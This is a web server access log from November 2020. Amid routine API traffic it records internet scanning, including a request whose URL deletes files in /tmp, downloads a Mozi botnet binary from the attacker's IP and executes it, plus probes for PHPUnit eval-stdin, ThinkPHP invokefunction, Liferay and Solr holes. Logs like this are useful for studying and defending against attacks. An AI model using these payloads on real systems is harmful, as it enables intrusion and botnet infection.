fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:12:47:35 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:12:58:37 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:13:09:40 +0000] "GET /api/socket HTTP/1.1" 200 4079 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:13:20:44 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:80 42.235.167.78 - - [27/Nov/2020:13:37:30 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://42.235.167.78:54345/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 302 737 "-" "Hello, world"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:13:31:46 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:13:42:49 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:80 91.241.19.84 - - [27/Nov/2020:13:53:56 +0000] "POST /api/jsonws/invoke HTTP/1.1" 302 544 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
fenix.geolynx.com.ar:80 91.241.19.84 - - [27/Nov/2020:13:53:56 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 610 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
fenix.geolynx.com.ar:80 91.241.19.84 - - [27/Nov/2020:13:53:56 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 302 570 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
fenix.geolynx.com.ar:80 91.241.19.84 - - [27/Nov/2020:13:53:56 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 610 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
fenix.geolynx.com.ar:80 91.241.19.84 - - [27/Nov/2020:13:53:56 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 302 746 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
